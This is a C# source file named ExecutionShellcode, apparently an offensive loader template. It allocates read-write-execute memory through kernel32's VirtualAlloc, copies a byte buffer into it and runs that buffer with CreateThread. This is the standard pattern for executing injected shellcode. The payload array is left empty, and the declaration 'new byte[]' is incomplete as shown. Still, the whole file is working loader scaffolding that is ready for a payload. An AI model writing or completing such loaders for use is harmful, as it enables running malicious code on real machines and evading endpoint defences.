using System;
using System.Runtime.InteropServices;

namespace ExecutionShellcode
{
    internal class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        public const uint MEM_COMMIT = 0x00001000;
        public const uint MEM_RESERVE = 0x00002000;

        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            byte[] buf = new byte[];

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Console.WriteLine("[*]Space memory created, the direction is: 0x{0:X16}", (addr).ToInt64());

            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
